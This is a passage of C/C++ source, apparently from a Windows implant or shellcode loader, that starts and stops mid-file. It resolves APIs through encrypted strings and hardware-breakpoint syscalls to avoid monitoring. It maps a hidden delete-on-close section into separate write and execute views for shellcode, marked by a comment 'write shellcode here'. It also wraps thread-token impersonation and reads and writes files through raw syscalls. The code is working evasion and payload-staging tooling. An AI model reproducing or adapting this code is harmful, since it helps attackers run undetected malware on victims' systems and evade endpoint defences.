    RESOLVE(t, kernel32Base, DeleteFileW);
    RESOLVE(t, kernel32Base, CreateFileW);
    // Named pipe
    RESOLVE(t, kernel32Base, CreateNamedPipeW);
    RESOLVE(t, kernel32Base, ConnectNamedPipe);
    RESOLVE(t, kernel32Base, WaitNamedPipeW);
    RESOLVE(t, kernel32Base, DisconnectNamedPipe);
    RESOLVE(t, kernel32Base, SetNamedPipeHandleState);
    RESOLVE(t, kernel32Base, CopyFileW);
    RESOLVE(t, kernel32Base, LoadLibraryW);
    RESOLVE(t, kernel32Base, SetFileAttributesW);
    /* Removed API-forwarded functions resolved lazily via REQUIRES_MODULE:
       RegOpenKeyExW, RegSetValueExW   -> advapi32.dll
       CryptBinaryToStringW, CryptAcquireContextW -> crypt32.dll / advapi32.dll
       AcquireCredentialsHandleW      -> secur32.dll */
    RESOLVE(t, kernel32Base, Process32FirstW);
    RESOLVE(t, kernel32Base, Process32NextW);
    RESOLVE(t, kernel32Base, GetDiskFreeSpaceExW);
    RESOLVE(t, kernel32Base, GetWindowsDirectoryW);
    RESOLVE(t, kernel32Base, GetLogicalDriveStringsW);
    RESOLVE(t, kernel32Base, GetDriveTypeW);
    RESOLVE(t, kernel32Base, CreateEventW);
    RESOLVE(t, kernel32Base, ResetEvent);
    RESOLVE(t, kernel32Base, WaitForSingleObject);
    RESOLVE(t, kernel32Base, PeekNamedPipe);
    RESOLVE(t, kernel32Base, GetModuleFileNameW);
    RESOLVE(t, kernel32Base, GetModuleHandleW);
    RESOLVE(t, kernel32Base, FindResourceW);
    RESOLVE(t, kernel32Base, EnumSystemLocalesW);
}

PPEB getCurrentPEB(void) {
    PPEB Peb = {};
    #ifdef _WIN64
        Peb = (PPEB)__readgsqword(0x60); // x64: GS segment register
    #else
        Peb = (PPEB)__readfsdword(0x30); // x86: FS segment register
    #endif
    return Peb;
}

HANDLE __GetProcessHeap(PPEB PEB) {
    return (HANDLE)PEB->ProcessHeap;
}

PTEB __getCurrentTEB(PPEB PEB){
    return NtCurrentTeb();
}

HANDLE __getCurrentProcessID(void) {
    return NtCurrentTeb()->ClientId.UniqueProcess;
}

DWORD __getCurrentThreadID(void) {
    return (DWORD)(ULONG_PTR)NtCurrentTeb()->ClientId.UniqueThread;
}

#define ASSIGN_SYSCALL_WRAPPER(funcName) \
    funcTable->funcName = (p##funcName)&syscall##funcName;

bool setNTAPISyscalls(functionTable* funcTable) {
    ASSIGN_SYSCALL_WRAPPER(NtDeviceIoControlFile);
    ASSIGN_SYSCALL_WRAPPER(NtQueryVolumeInformationFile);
    ASSIGN_SYSCALL_WRAPPER(NtQueryInformationFile);
    ASSIGN_SYSCALL_WRAPPER(NtReadFile);
    ASSIGN_SYSCALL_WRAPPER(NtSetInformationFile);
    ASSIGN_SYSCALL_WRAPPER(NtOpenFile);
    ASSIGN_SYSCALL_WRAPPER(NtWriteFile);
    ASSIGN_SYSCALL_WRAPPER(NtCreateFile);
    ASSIGN_SYSCALL_WRAPPER(NtDeleteFile);
    ASSIGN_SYSCALL_WRAPPER(NtAllocateVirtualMemory);
    ASSIGN_SYSCALL_WRAPPER(NtFreeVirtualMemory);
    ASSIGN_SYSCALL_WRAPPER(NtClose);
    ASSIGN_SYSCALL_WRAPPER(NtInitiatePowerAction);
    ASSIGN_SYSCALL_WRAPPER(NtQuerySystemInformation);
    ASSIGN_SYSCALL_WRAPPER(NtCreateSection);
    ASSIGN_SYSCALL_WRAPPER(NtUnmapViewOfSection);
    ASSIGN_SYSCALL_WRAPPER(NtMapViewOfSection);
    ASSIGN_SYSCALL_WRAPPER(NtQueryInformationProcess);
    ASSIGN_SYSCALL_WRAPPER(NtCreateProcess);
    ASSIGN_SYSCALL_WRAPPER(NtCreateUserProcess);
    ASSIGN_SYSCALL_WRAPPER(NtCreateThreadEx);
    ASSIGN_SYSCALL_WRAPPER(NtTerminateProcess);
    ASSIGN_SYSCALL_WRAPPER(NtTerminateThread);
    ASSIGN_SYSCALL_WRAPPER(NtWaitForSingleObject);
    ASSIGN_SYSCALL_WRAPPER(NtQueryDirectoryFile);
    ASSIGN_SYSCALL_WRAPPER(NtOpenDirectoryObject);
    ASSIGN_SYSCALL_WRAPPER(NtFlushInstructionCache);
    ASSIGN_SYSCALL_WRAPPER(NtSetInformationThread);

    return true;
}

bool doTwoTablesBelongToSameProcess(functionTable* table1, functionTable* table2) {
    return (table1->parameters.processID == table2->parameters.processID);
}

bool doTwoTablesBelongToSameThread(functionTable* table1, functionTable* table2) {
    return (table1->parameters.threadID == table2->parameters.threadID);
}

bool initParams(functionTable* funcTable) {
    funcTable->parameters.PEB = getCurrentPEB();
    funcTable->parameters.processHeap = __GetProcessHeap(funcTable->parameters.PEB);
    funcTable->parameters.TEB = __getCurrentTEB(funcTable->parameters.PEB);
    funcTable->parameters.processID = __getCurrentProcessID();
    funcTable->parameters.threadID = __getCurrentThreadID();
    return true;
}

/*
 * 
 * 
 * 
 * 
 * 
 *  Fruit for thought.
 * 
 * 
 * 
 * 
 * 
 */

// -----------------------------------------------------------------------
// orchestrates allocation + sub-inits
// -----------------------------------------------------------------------
functionTable* InitializeFunctionTable(bool initWin32API, bool initWin32u, bool _initWin32uSyscalls, bool _initSyscalls) {
    functionTable* funcTable = NULL;
    SIZE_T size          = sizeof(functionTable);
    
    HMODULE ntdllBase    = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));
    HMODULE kernel32Base = GetModuleBaseAddress(lcg_encryptw(L"kernel32.dll"));

    pNtAllocateVirtualMemory tmpNtAllocateVirtualMemory =
        (pNtAllocateVirtualMemory) __GetProcAddress(ntdllBase, lcg_encrypt("NtAllocateVirtualMemory"));
    NTSTATUS status = tmpNtAllocateVirtualMemory(
        NtCurrentProcess(),
        (PVOID*)&funcTable,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!NT_SUCCESS(status)) {
        return NULL;
    }
    __memset(funcTable, 0, size);

    funcTable->parameters.PEB = getCurrentPEB();

    funcTable->NtAllocateVirtualMemory = tmpNtAllocateVirtualMemory;

    initntdll(funcTable, ntdllBase);
    initkernel32(funcTable, kernel32Base);
    initwide(funcTable, kernel32Base);
    LoadCRT(funcTable);

    /* Lazy loading: modules are loaded on-demand via REQUIRES_MODULE */
    funcTable->loadedModules = 0;
    ModuleCache::InitModuleCache();
    /* Pre-populate cache with already-loaded ntdll/kernel32 handles */
    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::NTDLL)].handle = (HMODULE)ntdllBase;
    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::NTDLL)].loaded = true;
    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::KERNEL32)].handle = (HMODULE)kernel32Base;
    ModuleCache::g_moduleCache.entries[static_cast<size_t>(ModuleCache::Module::KERNEL32)].loaded = true;

    c_debugPrint(funcTable, "Module loading complete (ntdll + kernel32 only; other modules load lazily)");

    initParams(funcTable);

    if(_initSyscalls) {
        c_debugPrint(funcTable, "Initializing syscalls...");
        if(!initSyscalls(SYSCALLS_ID::HWSYSCALLS)) {
            c_debugPrint(funcTable, "Unable to retrieve syscalls.");
        }
        else {
            setNTAPISyscalls(funcTable);
            funcTable->parameters.areSyscallsInitialized = true;
            c_debugPrint(funcTable, "Syscalls initialized.");
        }
    }

    return funcTable;
}

functionTable* InitializeFunctionTable(void) {
    return InitializeFunctionTable(true, true, false, false);
}


HMODULE __LoadLibraryW(functionTable* funcTable, PWCHAR dllName) {
    UNICODE_STRING us = {0};
    __RtlInitUnicodeString(&us, dllName);
    PVOID base = NULL;
    ULONG flags = 0;
    NTSTATUS status = funcTable->LdrLoadDll(
        NULL,    // default search path
        &flags,  // default characteristics
        &us,     // the DLL name
        &base    // out: module handle
    );
    if (!NT_SUCCESS(status)) { return NULL; }

    return (HMODULE)base;
}


HMODULE __LoadLibraryW(PWCHAR dllName) {
    static HMODULE ntdllBase = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));

    static pLdrLoadDll LdrLoadDll = (pLdrLoadDll)__GetProcAddress(ntdllBase, lcg_encrypt("LdrLoadDll"));

    UNICODE_STRING us = {0};
    __RtlInitUnicodeString(&us, dllName);
    PVOID base = NULL;
    ULONG flags = 0;
    NTSTATUS status = LdrLoadDll(
        NULL,    // default search path
        &flags,  // default characteristics
        &us,     // the DLL name
        &base    // out: module handle
    );
    if (!NT_SUCCESS(status)) { return NULL; }

    return (HMODULE)base;
}

extern "C"
HMODULE __LoadLibraryA(LPCSTR dllName)
{
    if (!dllName) return NULL;

    // Calculate required buffer size (including null terminator)
    size_t len = __strlen(dllName);
    size_t wideSize = (len + 1) * sizeof(wchar_t);  // +1 for null terminator
    
    // Dynamically allocate memory
    wchar_t* wideName = (wchar_t*)__malloc(wideSize);
    if (!wideName) return NULL;

    // ANSI -> wide conversion
    size_t result = __mbstowcs(wideName, dllName, len + 1);
    if (result == (size_t)-1) {
        __free(wideName);
        return NULL;
    }

    // wcscpy already null-terminates, but let's be explicit
    wideName[result] = L'\0';

    // Call the wide version
    HMODULE hModule = __LoadLibraryW(wideName);
    
    // Free the temporary buffer
    __free(wideName);
    
    return hModule;
}

extern "C"
void __FreeLibrary(HMODULE hMod) {
    HMODULE k32 = GetModuleBaseAddress(lcg_encryptw(L"kernel32.dll"));
    typedef BOOL (WINAPI *pfn)(HMODULE);
    pfn fn = (pfn)__GetProcAddress(k32, lcg_encrypt("FreeLibrary"));
    if (fn) fn(hMod);
}

bool __stdcall __SetThreadToken(PHANDLE Thread, HANDLE Token)
{
    static HMODULE ntdllBase = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));

    static pNtSetInformationThread NtSetInformationThread = (pNtSetInformationThread)__GetProcAddress(ntdllBase, lcg_encrypt("NtSetInformationThread"));
  PVOID v2; // rcx
  NTSTATUS st; // eax
  HANDLE ThreadInformation; // [rsp+38h] [rbp+10h] BYREF

  ThreadInformation = Token;
  if ( Thread ) {
        v2 = (PVOID)*Thread;
    } else {
        v2 = NtCurrentThread();
    }
  st = NtSetInformationThread((HANDLE)v2, ThreadImpersonationToken, &ThreadInformation, sizeof(HANDLE));
  if (NT_SUCCESS(st)) return 1;
  return 0;
}

bool __stdcall __RevertToSelf(void)
{
    static HMODULE ntdllBase = GetModuleBaseAddress(lcg_encryptw(L"ntdll.dll"));

    static pNtSetInformationThread NtSetInformationThread = (pNtSetInformationThread)__GetProcAddress(ntdllBase, lcg_encrypt("NtSetInformationThread"));
  NTSTATUS st  ={}; // eax
  __int64 ThreadInformation = {}; // [rsp+30h] [rbp+8h] BYREF

  ThreadInformation = 0;
  st = NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &ThreadInformation, sizeof(HANDLE));
  if ( !NT_SUCCESS(st) )
    return false;
  return true;
}


DWORD __WaitForSingleObject(functionTable* funcTable, HANDLE hHandle, DWORD dwMilliseconds) {
    NTSTATUS status = funcTable->NtWaitForSingleObject(hHandle, dwMilliseconds, NULL);
    if (status == STATUS_TIMEOUT) {
        return WAIT_TIMEOUT;
    } else if (status == STATUS_USER_APC) {
        return WAIT_IO_COMPLETION;
    } else if (status == STATUS_ALERTED) {
        return WAIT_OBJECT_0; /* not the right status but oh well */
    }
    return NT_SUCCESS(status) ? WAIT_OBJECT_0 : WAIT_FAILED;
}

BOOL __DeviceIoControl(
    functionTable* funcTable,
    HANDLE hDevice,
    DWORD dwIoControlCode,
    LPVOID lpInBuffer,
    DWORD nInBufferSize,
    LPVOID lpOutBuffer,
    DWORD nOutBufferSize,
    LPDWORD lpBytesReturned,
    LPOVERLAPPED lpOverlapped
) {
    IO_STATUS_BLOCK ioStatus = {};
    HANDLE eventHandle = NULL;
    BOOL ownEvent = FALSE;

    if (lpOverlapped) {
        eventHandle = lpOverlapped->hEvent;
        if (!eventHandle) {
            eventHandle = funcTable->CreateEventW(NULL, TRUE, FALSE, NULL);
            if (!eventHandle) {
                return FALSE;
            }
            ownEvent = TRUE;
        }
    }

    NTSTATUS status = funcTable->NtDeviceIoControlFile(
        hDevice,
        eventHandle,
        NULL,
        NULL,
        &ioStatus,
        dwIoControlCode,
        lpInBuffer,
        nInBufferSize,
        lpOutBuffer,
        nOutBufferSize
    );

    if (status == STATUS_PENDING && eventHandle) {
        __WaitForSingleObject(funcTable, eventHandle, INFINITE);
        status = ioStatus.Status;
    }

    if (NT_SUCCESS(status)) {
        if (lpBytesReturned) {
            *lpBytesReturned = (DWORD)ioStatus.Information;
        }
        if (ownEvent) funcTable->NtClose(eventHandle);
        return TRUE;
    } else {
        if (lpBytesReturned) {
            *lpBytesReturned = 0;
        }
        if (ownEvent) funcTable->NtClose(eventHandle);
        return FALSE;
    }
}



PVOID get_text_section(PVOID moduleBase, DWORD* outSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((BYTE*)moduleBase + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if ((sec[i].Characteristics & IMAGE_SCN_CNT_CODE) &&
            (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE)) {
            *outSize = sec[i].Misc.VirtualSize;
            return (PVOID)((BYTE*)moduleBase + sec[i].VirtualAddress);
        }
    }
    return NULL;
}





PVOID MapPhantomSection(functionTable* funcTable,
                                SIZE_T minSize,
                                PVOID* outExecAddr,
                                PVOID* outRwView,
                                SIZE_T* outMappedSize,
                                PWCHAR targetFileName)
{
    SIZE_T aligned = (minSize + 0xFFF) & ~(SIZE_T)0xFFF;
    HANDLE hFile   = NULL;
    UNICODE_STRING tempPath = {};
    __RtlInitUnicodeString(&tempPath, targetFileName);
    debugPrint("Initialized string for temp file creation...");
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa, &tempPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    IO_STATUS_BLOCK iosb = {};

    funcTable->NtCreateFile(
        &hFile,
        FILE_READ_DATA | FILE_WRITE_DATA | FILE_EXECUTE | SYNCHRONIZE | DELETE,
        &oa, &iosb, NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE,
        NULL, 0
    );

    // 2. Extend to aligned size (kernel requires file >= section size)
    FILE_END_OF_FILE_INFORMATION eof = {};
    eof.EndOfFile.QuadPart = (LONGLONG)aligned;
    funcTable->NtSetInformationFile(hFile, &iosb, &eof, sizeof(eof), FileEndOfFileInformation);

    HANDLE   hSection = NULL;

    LARGE_INTEGER secSize;
    secSize.QuadPart = (LONGLONG)aligned;


    // No file handle - pagefile backed, always succeeds, no DACL friction
    NTSTATUS st = funcTable->NtCreateSection(
        &hSection,
        SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE | SECTION_QUERY,
        NULL, &secSize,
        PAGE_EXECUTE_READWRITE,
        SEC_COMMIT,
        hFile
    );
    funcTable->NtClose(hFile);
    hFile = NULL;
    if (!NT_SUCCESS(st)) {
        debugPrint("[phantom] NtCreateSection (pagefile) failed: 0x%lx", st);
        return NULL;
    }


    debugPrint("[phantom] NtCreateSection OK: %p", hSection);


    // -- View 1: RW - write shellcode here, then unmap ---------
    PVOID  rwView = NULL;
    SIZE_T rwSize = 0;
    st = funcTable->NtMapViewOfSection(
        hSection, NtCurrentProcess(),
        &rwView, 0, 0, NULL, &rwSize,
        ViewUnmap, 0, PAGE_READWRITE
    );
    if (!NT_SUCCESS(st)) {
        debugPrint("[phantom] NtMapViewOfSection (RW) failed: 0x%lx", st);
        funcTable->NtClose(hSection);
        return NULL;
    }
    debugPrint("[phantom] RW view: %p (%zu bytes)", rwView, rwSize);


    // -- View 2: RX - execution target, distinct VA ------------
    PVOID  rxView = NULL;
    SIZE_T rxSize = 0;
    st = funcTable->NtMapViewOfSection(
        hSection, NtCurrentProcess(),
        &rxView, 0, 0, NULL, &rxSize,
        ViewUnmap, 0, PAGE_EXECUTE_READ
    );
    funcTable->NtClose(hSection);  // section object no longer needed - both views hold refs
    hSection = NULL;
    if (!NT_SUCCESS(st)) {
        debugPrint("[phantom] NtMapViewOfSection (RX) failed: 0x%lx", st);
        funcTable->NtUnmapViewOfSection(NtCurrentProcess(), rwView);
        return NULL;
    }
    debugPrint("[phantom] RX view: %p (%zu bytes)", rxView, rxSize);


    *outRwView     = rwView;
    *outExecAddr   = rxView;
    *outMappedSize = rxSize;
    return rxView;
}



// -------------------------------------------------------------
// Resource loading / XChaCha20 decryption
// -------------------------------------------------------------

const void* load_resource(functionTable* funcTable, HMODULE hMod, DWORD id,
                          const wchar_t* type, DWORD* out_len) {
    if (!hMod) return NULL;
    HRSRC   hRes  = funcTable->FindResourceW(hMod, MAKEINTRESOURCEW(id), type);
    if (!hRes) return NULL;
    HGLOBAL hGlob = funcTable->LoadResource(hMod, hRes);
    if (!hGlob) return NULL;
    *out_len = funcTable->SizeofResource(hMod, hRes);
    return funcTable->LockResource(hGlob);
}

/* ---------------------------------------------------------------------------
 * Read a file from disk into a heap buffer.
 * Returns pointer to buffer (caller must __free) and sets *outSize.
 * Uses NtCreateFile + NtReadFile for direct syscall execution.
 * Path must be a wide string (UTF-16LE) for full Unicode support.
 * --------------------------------------------------------------------------- */
unsigned char* readFileFromDisk(functionTable* funcTable,
                                       const wchar_t* path, DWORD* outSize)
{
    *outSize = 0;

    NTSTATUS status;
    HANDLE hFile = NULL;
    UNICODE_STRING ntPath = {};
    OBJECT_ATTRIBUTES objectAttributes = {};
    IO_STATUS_BLOCK ioStatusBlock = {};

    /* Calculate wide string length */
    size_t pathLen = 0;
    while (path[pathLen] && pathLen < 32767) pathLen++;

    if (pathLen == 0) {
        debugPrint("[readFile] Empty path");
        return NULL;
    }

    /* Convert Win32 path (C:\foo\bar) to NT path (\??\C:\foo\bar) */
    PWSTR filePart = nullptr;
    if (!funcTable->RtlDosPathNameToRelativeNtPathName_U(path, &ntPath, &filePart, nullptr)) {
        debugPrint("[readFile] RtlDosPathNameToRelativeNtPathName_U failed");
        return NULL;
    }

    /* Initialize OBJECT_ATTRIBUTES */
    InitializeObjectAttributes(&objectAttributes, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Open the file for reading */
    status = funcTable->NtCreateFile(
        &hFile,
        GENERIC_READ | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[readFile] NtCreateFile failed: 0x%08X", status);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    /* Get file size using NtQueryInformationFile */
    FILE_STANDARD_INFORMATION fileInfo = {};
    status = funcTable->NtQueryInformationFile(
        hFile,
        &ioStatusBlock,
        &fileInfo,
        sizeof(FILE_STANDARD_INFORMATION),
        FileStandardInformation
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[readFile] NtQueryInformationFile failed: 0x%08X", status);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    LARGE_INTEGER fileSize = fileInfo.EndOfFile;

    /* Refuse unreasonably large files (> 10 MB) */
    if (fileSize.QuadPart == 0 || fileSize.QuadPart > 10 * 1024 * 1024) {
        debugPrint("[readFile] File empty or too large: %lld bytes", fileSize.QuadPart);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    DWORD sz = (DWORD)fileSize.QuadPart;
    unsigned char* buf = (unsigned char*)__malloc(sz);
    if (!buf) {
        debugPrint("[readFile] malloc failed");
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    /* Read the entire file */
    status = funcTable->NtReadFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        buf,
        sz,
        NULL,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[readFile] NtReadFile failed: 0x%08X", status);
        __free(buf);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    DWORD bytesRead = (DWORD)ioStatusBlock.Information;
    if (bytesRead != sz) {
        debugPrint("[readFile] Short read: %lu / %lu", bytesRead, sz);
        __free(buf);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    funcTable->NtClose(hFile);
    funcTable->RtlFreeUnicodeString(&ntPath);
    *outSize = sz;
    debugPrint("[readFile] Read %lu bytes", sz);
    return buf;
}

/* ---------------------------------------------------------------------------
 * Write a buffer to a file on disk using NTAPI syscalls.
 * Returns TRUE on success, FALSE on failure.
 * Uses NtCreateFile + NtWriteFile for direct syscall execution.
 * @param path Wide string path (UTF-16LE) for full Unicode support
 * --------------------------------------------------------------------------- */
BOOL writeFileToDisk(functionTable* funcTable, const wchar_t* path, const uint8_t* data, DWORD dataSize) {
    NTSTATUS status;
    HANDLE hFile = NULL;
    UNICODE_STRING ntPath = {};
    OBJECT_ATTRIBUTES objectAttributes = {};
    IO_STATUS_BLOCK ioStatusBlock = {};
    LARGE_INTEGER byteOffset = {};

    debugPrint("[writeFile] Writing %lu bytes to: %ls", dataSize, path);

    /* Calculate wide string length */
    size_t pathLen = 0;
    while (path[pathLen] && pathLen < 32767) pathLen++;

    if (pathLen == 0) {
        debugPrint("[writeFile] Empty path");
        return FALSE;
    }

    /* Convert Win32 path (C:\foo\bar) to NT path (\??\C:\foo\bar) */
    PWSTR filePart = nullptr;
    if (!funcTable->RtlDosPathNameToRelativeNtPathName_U(path, &ntPath, &filePart, nullptr)) {
        debugPrint("[writeFile] RtlDosPathNameToRelativeNtPathName_U failed");
        return FALSE;
    }

    /* Initialize OBJECT_ATTRIBUTES */
    InitializeObjectAttributes(&objectAttributes, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Create/open the file */
    status = funcTable->NtCreateFile(
        &hFile,
        GENERIC_WRITE | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OVERWRITE_IF,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[writeFile] NtCreateFile failed: 0x%08X", status);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    /* Write the data */
    status = funcTable->NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        (PVOID)data,
        dataSize,
        &byteOffset,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[writeFile] NtWriteFile failed: 0x%08X", status);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    /* Verify write completed */
    if (ioStatusBlock.Information != dataSize) {
        debugPrint("[writeFile] Short write: %llu / %lu", ioStatusBlock.Information, dataSize);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    funcTable->NtClose(hFile);
    funcTable->RtlFreeUnicodeString(&ntPath);
    debugPrint("[writeFile] Successfully wrote %lu bytes", dataSize);
    return TRUE;
}

/* ---------------------------------------------------------------------------
 * Write a chunk of data to a file at a specific offset using NTAPI syscalls.
 * Returns TRUE on success, FALSE on failure.
 * Uses NtCreateFile + NtWriteFile with explicit byte offset for chunked writes.
 * @param path Wide string path (UTF-16LE) for full Unicode support
 * --------------------------------------------------------------------------- */
BOOL writeFileChunkToDisk(functionTable* funcTable, const wchar_t* path, const uint8_t* data, DWORD dataSize, LONGLONG byteOffset) {
    NTSTATUS status;
    HANDLE hFile = NULL;
    UNICODE_STRING ntPath = {};
    OBJECT_ATTRIBUTES objectAttributes = {};
    IO_STATUS_BLOCK ioStatusBlock = {};
    LARGE_INTEGER offset;
    offset.QuadPart = byteOffset;

    debugPrint("[writeFileChunk] Writing %lu bytes to %ls @ offset %lld", dataSize, path, byteOffset);

    /* Calculate wide string length */
    size_t pathLen = 0;
    while (path[pathLen] && pathLen < 32767) pathLen++;

    if (pathLen == 0) {
        debugPrint("[writeFileChunk] Empty path");
        return FALSE;
    }

    /* Convert Win32 path (C:\foo\bar) to NT path (\??\C:\foo\bar) */
    PWSTR filePart = nullptr;
    if (!funcTable->RtlDosPathNameToRelativeNtPathName_U(path, &ntPath, &filePart, nullptr)) {
        debugPrint("[writeFileChunk] RtlDosPathNameToRelativeNtPathName_U failed");
        return FALSE;
    }

    /* Initialize OBJECT_ATTRIBUTES */
    InitializeObjectAttributes(&objectAttributes, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Create/open the file for writing at specific offsets */
    status = funcTable->NtCreateFile(
        &hFile,
        GENERIC_WRITE | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ,
        FILE_OPEN_IF,        /* Open if exists, create if not */
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[writeFileChunk] NtCreateFile failed: 0x%08X", status);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    /* If data is NULL, just create/truncate the file and close */
    if (data == NULL || dataSize == 0) {
        /* Set end of file to truncate if opening existing file */
        if (byteOffset == 0) {
            FILE_END_OF_FILE_INFORMATION eofInfo = {};
            status = funcTable->NtSetInformationFile(
                hFile,
                &ioStatusBlock,
                &eofInfo,
                sizeof(eofInfo),
                FileEndOfFileInformation
            );
            if (!NT_SUCCESS(status)) {
                debugPrint("[writeFileChunk] NtSetInformationFile failed: 0x%08X", status);
            }
        }
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return TRUE;
    }

    /* Write the data at the specified offset */
    status = funcTable->NtWriteFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        (PVOID)data,
        dataSize,
        &offset,
        NULL
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[writeFileChunk] NtWriteFile failed: 0x%08X", status);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    /* Verify write completed */
    if (ioStatusBlock.Information != dataSize) {
        debugPrint("[writeFileChunk] Short write: %llu / %lu", ioStatusBlock.Information, dataSize);
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return FALSE;
    }

    funcTable->NtClose(hFile);
    funcTable->RtlFreeUnicodeString(&ntPath);
    debugPrint("[writeFileChunk] Successfully wrote %lu bytes @ offset %lld", dataSize, byteOffset);
    return TRUE;
}

/* ---------------------------------------------------------------------------
 * Read a chunk of data from a file at a specific offset using NTAPI syscalls.
 * Returns allocated buffer on success (caller must __free), NULL on failure.
 * Uses NtCreateFile + NtReadFile with explicit byte offset for chunked reads.
 * Path must be a wide string (UTF-16LE) for full Unicode support.
 * --------------------------------------------------------------------------- */
unsigned char* readFileChunkFromDisk(functionTable* funcTable, const wchar_t* path, DWORD* outSize, LONGLONG byteOffset, DWORD bytesToRead) {
    NTSTATUS status;
    HANDLE hFile = NULL;
    UNICODE_STRING ntPath = {};
    OBJECT_ATTRIBUTES objectAttributes = {};
    IO_STATUS_BLOCK ioStatusBlock = {};
    LARGE_INTEGER offset;
    offset.QuadPart = byteOffset;

    /* Calculate wide string length */
    size_t pathLen = 0;
    while (path[pathLen] && pathLen < 32767) pathLen++;

    if (pathLen == 0) {
        debugPrint("[readFileChunk] Empty path");
        return NULL;
    }

    debugPrint("[readFileChunk] Reading %lu bytes from path @ offset %lld", bytesToRead, byteOffset);

    /* Convert Win32 path (C:\foo\bar) to NT path (\??\C:\foo\bar) */
    PWSTR filePart = nullptr;
    if (!funcTable->RtlDosPathNameToRelativeNtPathName_U(path, &ntPath, &filePart, nullptr)) {
        debugPrint("[readFileChunk] RtlDosPathNameToRelativeNtPathName_U failed");
        return NULL;
    }

    /* Initialize OBJECT_ATTRIBUTES */
    InitializeObjectAttributes(&objectAttributes, &ntPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    /* Open the file for reading */
    status = funcTable->NtCreateFile(
        &hFile,
        GENERIC_READ | SYNCHRONIZE,
        &objectAttributes,
        &ioStatusBlock,
        NULL,
        FILE_ATTRIBUTE_NORMAL,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT,
        NULL,
        0
    );

    if (!NT_SUCCESS(status)) {
        debugPrint("[readFileChunk] NtCreateFile failed: 0x%08X", status);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    /* Allocate buffer for the chunk */
    unsigned char* buf = (unsigned char*)__malloc(bytesToRead);
    if (!buf) {
        funcTable->NtClose(hFile);
        funcTable->RtlFreeUnicodeString(&ntPath);
        return NULL;
    }

    /* Read the chunk at the specified offset */
    status = funcTable->NtReadFile(
        hFile,
        NULL,
        NULL,
        NULL,
        &ioStatusBlock,
        buf,
        bytesToRead,
        &offset,
        NULL
    );

    funcTable->NtClose(hFile);
    funcTable->RtlFreeUnicodeString(&ntPath);

    if (!NT_SUCCESS(status)) {
        debugPrint("[readFileChunk] NtReadFile failed: 0x%08X", status);
        __free(buf);
